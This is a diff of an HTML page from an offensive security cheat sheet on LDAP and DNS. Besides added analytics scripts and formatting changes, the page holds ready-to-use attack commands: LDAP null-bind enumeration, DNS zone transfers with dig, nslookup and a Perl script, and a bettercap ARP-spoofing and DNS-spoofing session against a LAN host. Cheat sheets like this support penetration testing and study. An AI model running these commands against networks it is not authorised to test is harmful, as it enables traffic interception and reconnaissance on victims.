@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:00 CET">
 <title>LDAP &amp; DNS :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1813,13 +1842,10 @@
     
     
     
-    
-
-<h3 id="ldap-null-bind-enumeration">LDAP Null Bind Enumeration</h3>
+    <h3 id="ldap-null-bind-enumeration">LDAP Null Bind Enumeration</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Syntax</span>
-ldapsearch -h <span style="color:#d88200">&#34;LENOMDELAMACHINELDAP&#34;</span> -p <span style="color:#d88200">&#34;LEPORTSURLEQUELONYACCEDE&#34;</span> -x -b <span style="color:#d88200">&#34;ou=UNE_OU_EXISTANTE,DC=QUIVABIEN,DC=SUITE,DC=FOO&#34;</span> -v</code></pre></div>
-<p><br/></p>
-
+ldapsearch -h <span style="color:#d88200">&#34;LENOMDELAMACHINELDAP&#34;</span> -p <span style="color:#d88200">&#34;LEPORTSURLEQUELONYACCEDE&#34;</span> -x -b <span style="color:#d88200">&#34;ou=UNE_OU_EXISTANTE,DC=QUIVABIEN,DC=SUITE,DC=FOO&#34;</span> -v
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="dns-zone-transfer">DNS Zone Transfer</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Zone transfer using dig</span>
 dig @&lt;ns&gt; -p <span style="color:#ae81ff">54011</span> AXFR &lt;host&gt;
@@ -1829,7 +1855,8 @@ dig @&lt;ns&gt; -p <span style="color:#ae81ff">54011</span> AXFR &lt;host&gt;
 nslookup -type<span style="color:#f92672">=</span>any
 &gt; <span style="color:#111">set</span> port &lt;port&gt;
 &gt; server &lt;ns&gt;   
-&gt; &lt;host&gt;</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e"># Custom PERL zone transfer</span>
+&gt; &lt;host&gt;
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e"># Custom PERL zone transfer</span>
 <span style="color:#75715e">#!/usr/bin/env perl</span>
 
 <span style="color:#00a8c8">use</span> <span style="color:#111">warnings</span><span style="color:#111">;</span>
@@ -1860,9 +1887,8 @@ nslookup -type<span style="color:#f92672">=</span>any
         <span style="color:#00a8c8">foreach</span> <span style="color:#00a8c8">my</span> <span style="color:#111">$rr</span> <span style="color:#111">(</span><span style="color:#111">@maZone</span><span style="color:#111">)</span> <span style="color:#111">{</span>
                 <span style="color:#111">$rr</span><span style="color:#f92672">-&gt;</span><span style="color:#00a8c8">print</span><span style="color:#111">;</span>
         <span style="color:#111">}</span>
-<span style="color:#111">}</span></code></pre></div>
-<p><br/></p>
-
+<span style="color:#111">}</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="dns-spoofing">DNS Spoofing</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Using bettercap</span>
 <span style="color:#75715e"># In a local network, you can DNS queries using ARP spoofing</span>
@@ -1874,7 +1900,7 @@ nslookup -type<span style="color:#f92672">=</span>any
 &gt; net.show
 
 <span style="color:#75715e"># Set target for ARP spoofing</span>
-&gt; <span style="color:#111">set</span> arp.spoof.targets <span style="color:#ae81ff">192</span>.168.5.99
+&gt; <span style="color:#111">set</span> arp.spoof.targets 192.168.5.99
 
 <span style="color:#75715e"># Launch attack</span>
 &gt; arp.spoof on
@@ -1886,7 +1912,8 @@ nslookup -type<span style="color:#f92672">=</span>any
 
 <span style="color:#75715e"># You can then create a local web server</span>
 &gt; <span style="color:#111">set</span> http.server.path /var/www/html
-&gt; http.server on</code></pre></div>
+&gt; http.server on
+</code></pre></div>
 
     
     
